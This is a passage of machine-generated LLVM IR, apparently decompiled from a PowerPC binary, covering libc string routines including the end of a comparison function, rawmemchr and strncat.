  %v3_10026f7c = shl i32 %v0_10026f7c, %v2_10026f7c.pre-phi
  %v3_10026f80 = lshr i32 %v0_10026f80, %v2_10026f80.pre-phi
  store i32 %v3_10026f80, i32* %r9.global-to-local, align 4
  %v2_10026f84 = or i32 %v3_10026f7c, %v3_10026f80
  store i32 %v2_10026f84, i32* %r0.global-to-local, align 4
  %v1_10026f88 = add i32 %v0_10026f88, 8
  %v2_10026f88 = inttoptr i32 %v1_10026f88 to i32*
  %v3_10026f88 = load i32, i32* %v2_10026f88, align 4
  %v4_10026f8c = icmp eq i32 %v2_10026f84, %v1_10026f8c
  store i1 %v4_10026f8c, i1* %cr7_eq.global-to-local, align 1
  %v1_10026f90 = add i32 %v0_10026f90, 8
  %v2_10026f90 = inttoptr i32 %v1_10026f90 to i32*
  %v3_10026f90 = load i32, i32* %v2_10026f90, align 4
  br i1 %v4_10026f8c, label %dec_label_pc_10026f98, label %dec_label_pc_10026fe8

dec_label_pc_10026f98:                            ; preds = %dec_label_pc_10026f7c, %dec_label_pc_10026eec
  %v2_10026f9c.pre-phi = phi i32 [ %v2_10026f80.pre-phi, %dec_label_pc_10026f7c ], [ %.pre83, %dec_label_pc_10026eec ]
  %v2_10026f98.pre-phi = phi i32 [ %v2_10026f7c.pre-phi, %dec_label_pc_10026f7c ], [ %.pre82, %dec_label_pc_10026eec ]
  %v0_10026fc8 = phi i32 [ %v0_10026f90, %dec_label_pc_10026f7c ], [ %v1_10026ef8, %dec_label_pc_10026eec ]
  %v1_10026fa8 = phi i32 [ %v3_10026f90, %dec_label_pc_10026f7c ], [ %v2_10026edc, %dec_label_pc_10026eec ]
  %v0_10026fc4 = phi i32 [ %v0_10026f88, %dec_label_pc_10026f7c ], [ %v1_10026ef4, %dec_label_pc_10026eec ]
  %v0_10026fd0 = phi i32 [ %v3_10026f88, %dec_label_pc_10026f7c ], [ %v3_10026ee4, %dec_label_pc_10026eec ]
  %v0_10026f98 = phi i32 [ %v0_10026f80, %dec_label_pc_10026f7c ], [ %v2_10026ee0, %dec_label_pc_10026eec ]
  %v3_10026f98 = shl i32 %v0_10026f98, %v2_10026f98.pre-phi
  %v3_10026f9c = lshr i32 %v0_10026fd0, %v2_10026f9c.pre-phi
  store i32 %v3_10026f9c, i32* %r9.global-to-local, align 4
  %v2_10026fa0 = or i32 %v3_10026f98, %v3_10026f9c
  store i32 %v2_10026fa0, i32* %r0.global-to-local, align 4
  %v1_10026fa4 = add i32 %v0_10026fc4, 12
  %v2_10026fa4 = inttoptr i32 %v1_10026fa4 to i32*
  %v3_10026fa4 = load i32, i32* %v2_10026fa4, align 4
  %v4_10026fa8 = icmp eq i32 %v2_10026fa0, %v1_10026fa8
  store i1 %v4_10026fa8, i1* %cr7_eq.global-to-local, align 1
  %v1_10026fac = add i32 %v0_10026fc8, 12
  %v2_10026fac = inttoptr i32 %v1_10026fac to i32*
  %v3_10026fac = load i32, i32* %v2_10026fac, align 4
  br i1 %v4_10026fa8, label %dec_label_pc_10026fbc, label %dec_label_pc_10026fec

dec_label_pc_10026fbc:                            ; preds = %dec_label_pc_10026f98
  %v0_10026fbc = load i32, i32* %r6.global-to-local, align 4
  %v1_10026fbc = add i32 %v0_10026fbc, -4
  store i32 %v1_10026fbc, i32* %r6.global-to-local, align 4
  %v4_10026fbc = icmp eq i32 %v1_10026fbc, 0
  br i1 %v4_10026fbc, label %dec_label_pc_10026fd0, label %dec_label_pc_10026fc4

dec_label_pc_10026fc4:                            ; preds = %dec_label_pc_10026fbc
  %v1_10026fc4 = add i32 %v0_10026fc4, 16
  %v1_10026fc8 = add i32 %v0_10026fc8, 16
  br label %dec_label_pc_10026f44

dec_label_pc_10026fd0:                            ; preds = %dec_label_pc_10026fbc
  %v3_10026fd0 = shl i32 %v0_10026fd0, %v2_10026f98.pre-phi
  %v3_10026fd4 = lshr i32 %v3_10026fa4, %v2_10026f9c.pre-phi
  store i32 %v3_10026fd4, i32* %r9.global-to-local, align 4
  %v2_10026fd8 = or i32 %v3_10026fd4, %v3_10026fd0
  store i32 %v2_10026fd8, i32* %r0.global-to-local, align 4
  %v4_10026fe0 = icmp eq i32 %v2_10026fd8, %v3_10026fac
  store i1 %v4_10026fe0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10026fe0, label %dec_label_pc_10027000, label %dec_label_pc_10026fe8

dec_label_pc_10026fe8:                            ; preds = %dec_label_pc_10026f7c, %dec_label_pc_10026f44, %dec_label_pc_10026fd0
  %v1_10026fe8 = phi i32 [ %v1_10026f8c, %dec_label_pc_10026f7c ], [ %v1_10026f54, %dec_label_pc_10026f44 ], [ %v3_10026fac, %dec_label_pc_10026fd0 ]
  %v0_10026fe8 = phi i32 [ %v2_10026f84, %dec_label_pc_10026f7c ], [ %v2_10026f4c, %dec_label_pc_10026f44 ], [ %v2_10026fd8, %dec_label_pc_10026fd0 ]
  %v3_10026fe8 = icmp ugt i32 %v0_10026fe8, %v1_10026fe8
  %v4_10026fe8 = icmp eq i32 %v0_10026fe8, %v1_10026fe8
  store i1 %v4_10026fe8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026fe8, label %dec_label_pc_10026ff8, label %dec_label_pc_10026ff0

dec_label_pc_10026fec:                            ; preds = %dec_label_pc_10026f98, %dec_label_pc_10026f60
  %v1_10026fb4 = phi i32 [ %v1_10026fa8, %dec_label_pc_10026f98 ], [ %v1_10026f70, %dec_label_pc_10026f60 ]
  %v0_10026fb4 = phi i32 [ %v2_10026fa0, %dec_label_pc_10026f98 ], [ %v2_10026f68, %dec_label_pc_10026f60 ]
  %v3_10026fb4 = icmp ugt i32 %v0_10026fb4, %v1_10026fb4
  %v4_10026fb4 = icmp eq i32 %v0_10026fb4, %v1_10026fb4
  store i1 %v4_10026fb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026fb4, label %dec_label_pc_10026ff8, label %dec_label_pc_10026ff0

dec_label_pc_10026ff0:                            ; preds = %dec_label_pc_10026fe8, %dec_label_pc_10026fec
  br label %dec_label_pc_10027000

dec_label_pc_10026ff8:                            ; preds = %dec_label_pc_10026fe8, %dec_label_pc_10026fec
  br label %dec_label_pc_10027000

dec_label_pc_10027000:                            ; preds = %dec_label_pc_10026ff8, %dec_label_pc_10026ff0, %dec_label_pc_10026fd0, %dec_label_pc_10026ea8, %dec_label_pc_10026ea0, %dec_label_pc_10026e8c
  %storemerge = phi i32 [ 0, %dec_label_pc_10026e8c ], [ -1, %dec_label_pc_10026ea0 ], [ 1, %dec_label_pc_10026ea8 ], [ 0, %dec_label_pc_10026fd0 ], [ -1, %dec_label_pc_10026ff0 ], [ 1, %dec_label_pc_10026ff8 ]
  %v3_10027000 = icmp eq i32 %storemerge, 0
  store i1 %v3_10027000, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10027000, label %dec_label_pc_10027014, label %dec_label_pc_10027054

dec_label_pc_1002700c:                            ; preds = %dec_label_pc_10026d7c, %dec_label_pc_10027028
  %v0_1002700c = phi i32 [ %v2_10027038, %dec_label_pc_10027028 ], [ %v2_10026d90, %dec_label_pc_10026d7c ]
  br label %dec_label_pc_10027054

dec_label_pc_10027014:                            ; preds = %dec_label_pc_10027000
  %v0_10027014 = load i32, i32* @r31, align 4
  %v1_10027014 = call i32 @__asm_rlwinm(i32 %v0_10027014, i32 0, i32 0, i32 29)
  store i32 %v1_10027014, i32* %r0.global-to-local, align 4
  %v0_10027018 = load i32, i32* @r31, align 4
  %v1_10027018 = urem i32 %v0_10027018, 4
  %v0_1002701c = load i32, i32* %r29.global-to-local, align 4
  %v2_1002701c = add i32 %v0_1002701c, %v1_10027014
  store i32 %v2_1002701c, i32* @r4, align 4
  %v0_10027020 = load i32, i32* @r30, align 4
  %v2_10027020 = add i32 %v0_10027020, %v1_10027014
  store i32 %v2_10027020, i32* @r3, align 4
  br label %dec_label_pc_10027044

dec_label_pc_10027028:                            ; preds = %dec_label_pc_1002704c
  %v0_10027028 = load i32, i32* @r3, align 4
  %v1_10027028 = inttoptr i32 %v0_10027028 to i8*
  %v2_10027028 = load i8, i8* %v1_10027028, align 1
  %v3_10027028 = zext i8 %v2_10027028 to i32
  store i32 %v3_10027028, i32* %r9.global-to-local, align 4
  %v1_1002702c = add i32 %v0_10027028, 1
  store i32 %v1_1002702c, i32* @r3, align 4
  %v0_10027030 = load i32, i32* @r4, align 4
  %v1_10027030 = inttoptr i32 %v0_10027030 to i8*
  %v2_10027030 = load i8, i8* %v1_10027030, align 1
  %v3_10027030 = zext i8 %v2_10027030 to i32
  store i32 %v3_10027030, i32* %r0.global-to-local, align 4
  %v1_10027034 = add i32 %v0_10027030, 1
  store i32 %v1_10027034, i32* @r4, align 4
  %v2_10027038 = sub nsw i32 %v3_10027028, %v3_10027030
  store i32 %v2_10027038, i32* %r9.global-to-local, align 4
  %v4_1002703c = icmp eq i8 %v2_10027028, %v2_10027030
  br i1 %v4_1002703c, label %dec_label_pc_1002704c, label %dec_label_pc_1002700c

dec_label_pc_10027044:                            ; preds = %entry, %dec_label_pc_10027014
  %v0_10027044 = phi i32 [ %arg1, %entry ], [ %v1_10027018, %dec_label_pc_10027014 ]
  %v1_10027044 = add i32 %v0_10027044, 1
  br label %dec_label_pc_1002704c

dec_label_pc_1002704c:                            ; preds = %dec_label_pc_10027028, %dec_label_pc_10027044
  %v0_1002704c = phi i32 [ %v1_1002704c, %dec_label_pc_10027028 ], [ %v1_10027044, %dec_label_pc_10027044 ]
  %v1_1002704c = add i32 %v0_1002704c, -1
  %v2_1002704c = icmp eq i32 %v1_1002704c, 0
  br i1 %v2_1002704c, label %dec_label_pc_10027050, label %dec_label_pc_10027028

dec_label_pc_10027050:                            ; preds = %dec_label_pc_1002704c
  br label %dec_label_pc_10027054

dec_label_pc_10027054:                            ; preds = %dec_label_pc_10027000, %dec_label_pc_1002700c, %dec_label_pc_10027050
  %v0_1002705c = phi i32 [ %storemerge, %dec_label_pc_10027000 ], [ %v0_1002700c, %dec_label_pc_1002700c ], [ 0, %dec_label_pc_10027050 ]
  ret i32 %v0_1002705c

; uselistorder directives
  uselistorder i32 %v1_1002704c, { 1, 0 }
  uselistorder i32 %v2_10027038, { 1, 0 }
  uselistorder i32 %v0_10026fb4, { 1, 0 }
  uselistorder i32 %v1_10026fb4, { 1, 0 }
  uselistorder i32 %v0_10026fe8, { 1, 0 }
  uselistorder i32 %v1_10026fe8, { 1, 0 }
  uselistorder i32 %v2_10026f98.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v2_10026f9c.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v1_10026f70, { 1, 0 }
  uselistorder i32 %v0_10026ed0, { 0, 2, 1 }
  uselistorder i32 %v1_10026ec4, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v1_10026eb8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10026e98, { 1, 0 }
  uselistorder i32 %v1_10026e98, { 1, 0 }
  uselistorder i32 %v1_10026e78, { 1, 0 }
  uselistorder i32 %v1_10026db4, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_10026dac, { 1, 5, 4, 3, 2, 6, 0 }
  uselistorder i32 %v1_10026d98, { 1, 0 }
  uselistorder i32 %v0_10026e24, { 1, 2, 3, 4, 5, 6, 7, 10, 0, 9, 8 }
  uselistorder i32 %v0_10026e20, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0, 11, 10 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 10, 7, 8, 9, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 2, 5, 3, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 19, 18 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 2, 23, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 -8, { 4, 5, 6, 7, 9, 10, 3, 11, 2, 1, 8, 12, 13, 14, 0 }
  uselistorder i1 false, { 9, 10, 11, 5, 6, 12, 13, 20, 21, 24, 0, 23, 8, 14, 1, 2, 27, 28, 29, 7, 22, 25, 26, 17, 16, 3, 18, 19, 4, 15, 30, 31 }
  uselistorder i32 15, { 5, 6, 1, 0, 10, 7, 21, 18, 16, 17, 20, 8, 19, 9, 2, 3, 11, 12, 13, 4, 14, 15 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_10027054, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1002704c, { 1, 0 }
  uselistorder label %dec_label_pc_10027044, { 1, 0 }
  uselistorder label %dec_label_pc_1002700c, { 1, 0 }
  uselistorder label %dec_label_pc_10026ff8, { 1, 0 }
  uselistorder label %dec_label_pc_10026ff0, { 1, 0 }
  uselistorder label %dec_label_pc_10026fe8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10026ea8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026ea0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026e9c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10026d98, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10027060 = urem i32 %arg1, 256
  store i32 %v1_10027060, i32* %r4.global-to-local, align 4
  %v0_100270781 = load i32, i32* @r3, align 4
  %v1_100270782 = urem i32 %v0_100270781, 4
  %v3_100270784 = icmp eq i32 %v1_100270782, 0
  br i1 %v3_100270784, label %dec_label_pc_10027080, label %dec_label_pc_10027068

dec_label_pc_10027068:                            ; preds = %entry, %dec_label_pc_10027068
  %v1_1002706c = phi i32 [ %v0_10027080.pre, %dec_label_pc_10027068 ], [ %v1_10027060, %entry ]
  %v0_10027068 = phi i32 [ %v1_10027074, %dec_label_pc_10027068 ], [ %v0_100270781, %entry ]
  %v1_10027068 = inttoptr i32 %v0_10027068 to i8*
  %v2_10027068 = load i8, i8* %v1_10027068, align 1
  %v3_10027068 = zext i8 %v2_10027068 to i32
  %v4_1002706c = icmp eq i32 %v3_10027068, %v1_1002706c
  %v0_10027070 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1002706c, i32 %v0_10027070)
  %v0_10027074 = load i32, i32* @r3, align 4
  %v1_10027074 = add i32 %v0_10027074, 1
  store i32 %v1_10027074, i32* @r3, align 4
  %v1_10027078 = urem i32 %v1_10027074, 4
  %v3_10027078 = icmp eq i32 %v1_10027078, 0
  %v0_10027080.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10027078, label %dec_label_pc_10027080, label %dec_label_pc_10027068

dec_label_pc_10027080:                            ; preds = %dec_label_pc_10027068, %entry
  %v0_100270989 = phi i32 [ %v0_100270781, %entry ], [ %v1_10027074, %dec_label_pc_10027068 ]
  %v0_10027080 = phi i32 [ %v1_10027060, %entry ], [ %v0_10027080.pre, %dec_label_pc_10027068 ]
  %v1_10027080 = mul i32 %v0_10027080, 256
  %v2_10027088 = or i32 %v1_10027080, %v0_10027080
  %v1_10027090 = mul i32 %v2_10027088, 65536
  %v2_10027094 = or i32 %v1_10027090, %v2_10027088
  br label %dec_label_pc_10027098

dec_label_pc_10027098:                            ; preds = %dec_label_pc_10027104, %dec_label_pc_10027098, %dec_label_pc_10027080
  %v0_100270d4 = phi i32 [ %v0_100270989, %dec_label_pc_10027080 ], [ %v1_1002709c, %dec_label_pc_10027098 ], [ %v1_1002709c, %dec_label_pc_10027104 ]
  %v1_10027098 = inttoptr i32 %v0_100270d4 to i32*
  %v2_10027098 = load i32, i32* %v1_10027098, align 4
  %v1_1002709c = add i32 %v0_100270d4, 4
  store i32 %v0_100270d4, i32* @r10, align 4
  %v2_100270a4 = xor i32 %v2_10027098, %v2_10027094
  %v1_100270ac = add i32 %v2_100270a4, 2130640639
  %v2_100270b0 = xor i32 %v1_100270ac, %v2_100270a4
  %v1_100270b4 = add i32 %v0_100270d4, 1
  store i32 %v1_100270b4, i32* @r11, align 4
  %v2_100270b8 = and i32 %v2_100270b0, -2130640640
  %v6_100270b8 = icmp eq i32 %v2_100270b8, -2130640640
  br i1 %v6_100270b8, label %dec_label_pc_10027098, label %dec_label_pc_100270c0

dec_label_pc_100270c0:                            ; preds = %dec_label_pc_10027098
  %v2_100270c0 = inttoptr i32 %v0_100270d4 to i8*
  %v3_100270c0 = load i8, i8* %v2_100270c0, align 1
  %v4_100270c0 = zext i8 %v3_100270c0 to i32
  %v1_100270c4 = add i32 %v0_100270d4, 3
  store i32 %v1_100270c4, i32* @r8, align 4
  %v1_100270c8 = add i32 %v0_100270d4, 2
  %v4_100270cc = icmp eq i32 %v4_100270c0, %v0_10027080
  br i1 %v4_100270cc, label %dec_label_pc_100270d4, label %dec_label_pc_100270dc

dec_label_pc_100270d4:                            ; preds = %dec_label_pc_100270c0
  ret i32 %v0_100270d4

dec_label_pc_100270dc:                            ; preds = %dec_label_pc_100270c0
  %v2_100270dc = inttoptr i32 %v1_100270b4 to i8*
  %v3_100270dc = load i8, i8* %v2_100270dc, align 1
  %v4_100270dc = zext i8 %v3_100270dc to i32
  %v4_100270e0 = icmp eq i32 %v4_100270dc, %v0_10027080
  br i1 %v4_100270e0, label %dec_label_pc_100270e8, label %dec_label_pc_100270f0

dec_label_pc_100270e8:                            ; preds = %dec_label_pc_100270dc
  ret i32 %v1_100270b4

dec_label_pc_100270f0:                            ; preds = %dec_label_pc_100270dc
  %v2_100270f0 = inttoptr i32 %v1_100270c8 to i8*
  %v3_100270f0 = load i8, i8* %v2_100270f0, align 1
  %v4_100270f0 = zext i8 %v3_100270f0 to i32
  %v4_100270f4 = icmp eq i32 %v4_100270f0, %v0_10027080
  br i1 %v4_100270f4, label %dec_label_pc_100270fc, label %dec_label_pc_10027104

dec_label_pc_100270fc:                            ; preds = %dec_label_pc_100270f0
  ret i32 %v1_100270c8

dec_label_pc_10027104:                            ; preds = %dec_label_pc_100270f0
  %v2_10027104 = inttoptr i32 %v1_100270c4 to i8*
  %v3_10027104 = load i8, i8* %v2_10027104, align 1
  %v4_10027104 = zext i8 %v3_10027104 to i32
  %v4_10027108 = icmp eq i32 %v4_10027104, %v0_10027080
  br i1 %v4_10027108, label %dec_label_pc_10027110, label %dec_label_pc_10027098

dec_label_pc_10027110:                            ; preds = %dec_label_pc_10027104
  ret i32 %v1_100270c4

; uselistorder directives
  uselistorder i32 %v1_1002709c, { 1, 0 }
  uselistorder i32 %v0_100270d4, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v2_10027088, { 1, 0 }
  uselistorder i32 %v0_10027080, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10027074, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100270781, { 2, 1, 0 }
  uselistorder i32 %v1_10027060, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10027068, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1002711c

dec_label_pc_1002711c:                            ; preds = %dec_label_pc_1002711c, %entry
  %v0_1002711c = phi i32 [ %v1_10027120, %dec_label_pc_1002711c ], [ %tmp, %entry ]
  %v1_1002711c = inttoptr i32 %v0_1002711c to i8*
  %v2_1002711c = load i8, i8* %v1_1002711c, align 1
  %v1_10027120 = add i32 %v0_1002711c, 1
  store i32 %v1_10027120, i32* %r11.global-to-local, align 4
  %v3_10027124 = icmp eq i8 %v2_1002711c, 0
  store i1 %v3_10027124, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10027124, label %dec_label_pc_1002712c, label %dec_label_pc_1002711c

dec_label_pc_1002712c:                            ; preds = %dec_label_pc_1002711c
  %v3_1002712c = icmp eq i32 %arg2, 3
  store i1 %v3_1002712c, i1* %cr7_eq.global-to-local, align 1
  %v1_10027130 = add i32 %v0_1002711c, -1
  store i32 %v1_10027130, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_100271cc, label %dec_label_pc_1002713c

dec_label_pc_1002713c:                            ; preds = %dec_label_pc_1002712c
  %v1_1002713c = udiv i32 %arg2, 4
  store i32 %v1_1002713c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10027144

dec_label_pc_10027144:                            ; preds = %dec_label_pc_10027144.dec_label_pc_10027144_crit_edge, %dec_label_pc_1002713c
  %v2_10027154 = phi i32 [ %v0_10027148.pre, %dec_label_pc_10027144.dec_label_pc_10027144_crit_edge ], [ %v1_10027130, %dec_label_pc_1002713c ]
  %v0_10027144 = load i32, i32* @r4, align 4
  %v1_10027144 = inttoptr i32 %v0_10027144 to i8*
  %v2_10027144 = load i8, i8* %v1_10027144, align 1
  %v1_10027148 = add i32 %v2_10027154, 1
  store i32 %v1_10027148, i32* %r7.global-to-local, align 4
  %v1_1002714c = add i32 %v0_10027144, 1
  store i32 %v1_1002714c, i32* %r6.global-to-local, align 4
  %v3_10027150 = icmp eq i8 %v2_10027144, 0
  store i1 %v3_10027150, i1* %cr7_eq.global-to-local, align 1
  %v4_10027154 = inttoptr i32 %v1_10027148 to i8*
  store i8 %v2_10027144, i8* %v4_10027154, align 1
  %v0_10027158 = load i32, i32* @lr, align 4
  %v1_10027158 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10027158, i32 %v0_10027158)
  %v0_1002715c = load i32, i32* @r4, align 4
  %v1_1002715c = add i32 %v0_1002715c, 1
  %v2_1002715c = inttoptr i32 %v1_1002715c to i8*
  %v3_1002715c = load i8, i8* %v2_1002715c, align 1
  %v0_10027160 = load i32, i32* %r6.global-to-local, align 4
  %v1_10027160 = add i32 %v0_10027160, 1
  store i32 %v1_10027160, i32* @r8, align 4
  %v0_10027164 = load i32, i32* %r7.global-to-local, align 4
  %v1_10027164 = add i32 %v0_10027164, 1
  store i32 %v1_10027164, i32* @r10, align 4
  %v1_10027168 = add i32 %v0_10027160, 2
  store i32 %v1_10027168, i32* %r9.global-to-local, align 4
  %v1_1002716c = add i32 %v0_10027164, 2
  store i32 %v1_1002716c, i32* %r12.global-to-local, align 4
  %v1_10027170 = add i32 %v0_10027160, 3
  store i32 %v1_10027170, i32* @r4, align 4
  %v3_10027174 = icmp eq i8 %v3_1002715c, 0
  store i1 %v3_10027174, i1* %cr7_eq.global-to-local, align 1
  %v4_10027178 = inttoptr i32 %v1_10027164 to i8*
  store i8 %v3_1002715c, i8* %v4_10027178, align 1
  %v0_1002717c = load i32, i32* @lr, align 4
  %v1_1002717c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1002717c, i32 %v0_1002717c)
  %v0_10027180 = load i32, i32* %r6.global-to-local, align 4
  %v1_10027180 = add i32 %v0_10027180, 1
  %v2_10027180 = inttoptr i32 %v1_10027180 to i8*
  %v3_10027180 = load i8, i8* %v2_10027180, align 1
  %v0_10027184 = load i32, i32* %r12.global-to-local, align 4
  %v1_10027184 = add i32 %v0_10027184, 1
  store i32 %v1_10027184, i32* %r11.global-to-local, align 4
  %v3_10027188 = icmp eq i8 %v3_10027180, 0
  store i1 %v3_10027188, i1* %cr7_eq.global-to-local, align 1
  %v2_1002718c = load i32, i32* @r10, align 4
  %v3_1002718c = add i32 %v2_1002718c, 1
  %v4_1002718c = inttoptr i32 %v3_1002718c to i8*
  store i8 %v3_10027180, i8* %v4_1002718c, align 1
  %v0_10027190 = load i32, i32* @lr, align 4
  %v1_10027190 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10027190, i32 %v0_10027190)
  %v0_10027194 = load i32, i32* @r8, align 4
  %v1_10027194 = add i32 %v0_10027194, 1
  %v2_10027194 = inttoptr i32 %v1_10027194 to i8*
  %v3_10027194 = load i8, i8* %v2_10027194, align 1
  %v4_10027194 = zext i8 %v3_10027194 to i32
  store i32 %v4_10027194, i32* %r9.global-to-local, align 4
  %v3_10027198 = icmp eq i8 %v3_10027194, 0
  store i1 %v3_10027198, i1* %cr7_eq.global-to-local, align 1
  %v2_1002719c = load i32, i32* %r12.global-to-local, align 4
  %v3_1002719c = add i32 %v2_1002719c, 1
  %v4_1002719c = inttoptr i32 %v3_1002719c to i8*
  store i8 %v3_10027194, i8* %v4_1002719c, align 1
  %v0_100271a0 = load i32, i32* @lr, align 4
  %v1_100271a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100271a0, i32 %v0_100271a0)
  %v0_100271a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100271a4 = add i32 %v0_100271a4, -1
  store i32 %v1_100271a4, i32* %ctr.global-to-local, align 4
  %v2_100271a4 = icmp eq i32 %v1_100271a4, 0
  br i1 %v2_100271a4, label %dec_label_pc_100271a8, label %dec_label_pc_10027144.dec_label_pc_10027144_crit_edge

dec_label_pc_10027144.dec_label_pc_10027144_crit_edge: ; preds = %dec_label_pc_10027144
  %v0_10027148.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10027144

dec_label_pc_100271a8:                            ; preds = %dec_label_pc_10027144
  %v0_100271a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100271a8 = urem i32 %v0_100271a8, 4
  store i32 %v1_100271a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100271cc

dec_label_pc_100271b0:                            ; preds = %dec_label_pc_100271cc, %dec_label_pc_100271b0.dec_label_pc_100271b0_crit_edge
  %v0_100271b4 = phi i32 [ %v0_100271b4.pre, %dec_label_pc_100271b0.dec_label_pc_100271b0_crit_edge ], [ %v0_100271cc, %dec_label_pc_100271cc ]
  %v0_100271b0 = load i32, i32* @r4, align 4
  %v1_100271b0 = inttoptr i32 %v0_100271b0 to i8*
  %v2_100271b0 = load i8, i8* %v1_100271b0, align 1
  %v3_100271b0 = zext i8 %v2_100271b0 to i32
  store i32 %v3_100271b0, i32* %r9.global-to-local, align 4
  %v1_100271b4 = add i32 %v0_100271b4, -1
  store i32 %v1_100271b4, i32* %r5.global-to-local, align 4
  %v1_100271b8 = add i32 %v0_100271b0, 1
  store i32 %v1_100271b8, i32* @r4, align 4
  %v3_100271bc = icmp eq i8 %v2_100271b0, 0
  store i1 %v3_100271bc, i1* %cr7_eq.global-to-local, align 1
  %v2_100271c0 = load i32, i32* %r11.global-to-local, align 4
  %v3_100271c0 = add i32 %v2_100271c0, 1
  %v4_100271c0 = inttoptr i32 %v3_100271c0 to i8*
  store i8 %v2_100271b0, i8* %v4_100271c0, align 1
  store i32 %v3_100271c0, i32* %r11.global-to-local, align 4
  %v0_100271c4 = load i32, i32* @lr, align 4
  %v1_100271c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100271c4, i32 %v0_100271c4)
  %v0_100271d4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100271d4 = add i32 %v0_100271d4, -1
  store i32 %v1_100271d4, i32* %ctr.global-to-local, align 4
  %v2_100271d4 = icmp eq i32 %v1_100271d4, 0
  br i1 %v2_100271d4, label %dec_label_pc_100271d8, label %dec_label_pc_100271b0.dec_label_pc_100271b0_crit_edge

dec_label_pc_100271b0.dec_label_pc_100271b0_crit_edge: ; preds = %dec_label_pc_100271b0
  %v0_100271b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100271b0

dec_label_pc_100271cc:                            ; preds = %dec_label_pc_1002712c, %dec_label_pc_100271a8
  %v0_100271cc = phi i32 [ %arg2, %dec_label_pc_1002712c ], [ %v1_100271a8, %dec_label_pc_100271a8 ]
  store i32 %v0_100271cc, i32* %ctr.global-to-local, align 4
  %v2_100271d43 = icmp eq i32 %v0_100271cc, 0
  br i1 %v2_100271d43, label %dec_label_pc_100271d8, label %dec_label_pc_100271b0

dec_label_pc_100271d8:                            ; preds = %dec_label_pc_100271b0, %dec_label_pc_100271cc
  %v0_100271d8 = load i32, i32* %r9.global-to-local, align 4
  %v3_100271d8 = icmp eq i32 %v0_100271d8, 0
  store i1 %v3_100271d8, i1* %cr7_eq.global-to-local, align 1
  %v0_100271dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100271d8, i32 %v0_100271dc)
  %v0_100271e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100271e0 = trunc i32 %v0_100271e0 to i8
  %v2_100271e0 = load i32, i32* %r11.global-to-local, align 4
  %v3_100271e0 = add i32 %v2_100271e0, 1
  %v4_100271e0 = inttoptr i32 %v3_100271e0 to i8*
  store i8 %v1_100271e0, i8* %v4_100271e0, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_100271cc, { 1, 2, 0 }
  uselistorder i32 %v1_100271d4, { 1, 0 }
  uselistorder i32 %v1_100271a8, { 1, 0 }
